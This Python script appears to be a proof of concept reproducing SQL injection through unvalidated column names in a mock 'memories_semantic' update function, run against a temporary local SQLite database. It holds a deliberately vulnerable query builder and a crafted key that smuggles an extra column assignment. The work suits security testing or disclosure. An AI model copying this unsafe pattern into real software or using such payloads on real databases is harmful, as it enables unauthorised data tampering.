import sqlite3
import os

db_path = "test_injection5.db"
if os.path.exists(db_path):
    os.remove(db_path)

conn = sqlite3.connect(db_path)

# Mock table structure similar to memories_semantic
conn.execute("""
CREATE TABLE memories_semantic (
    id TEXT PRIMARY KEY,
    content TEXT,
    tenant TEXT,
    project_id TEXT,
    important_field TEXT
)
""")
conn.execute("INSERT INTO memories_semantic (id, content, tenant, project_id, important_field) VALUES ('mem1', 'old content', 't1', 'p1', 'safe')")
conn.execute("INSERT INTO memories_semantic (id, content, tenant, project_id, important_field) VALUES ('mem2', 'other content', 't2', 'p1', 'safe')")
conn.commit()

# Mock the vulnerable function logic
def vulnerable_update(memory_id, updates, tenant, project_id):
    table = "memories_semantic"

    set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
    params = list(updates.values()) + [memory_id, tenant, project_id]

    query = f"UPDATE {table} SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?"
    print(f"Executing: {query}")
    print(f"Params: {params}")

    cur = conn.execute(query, params)
    conn.commit()
    return cur.rowcount > 0

# Test IDOR via SQL injection in column name
print("--- BEFORE INJECTION ---")
cur = conn.execute("SELECT * FROM memories_semantic")
for row in cur.fetchall():
    print(row)

updates = {
    "important_field = (SELECT 'hacked'), content": "new content"
}

try:
    vulnerable_update('mem1', updates, 't1', 'p1')
except Exception as e:
    print(f"Error: {e}")

print("--- AFTER INJECTION ---")
cur = conn.execute("SELECT * FROM memories_semantic")
for row in cur.fetchall():
    print(row)

conn.close()
os.remove(db_path)
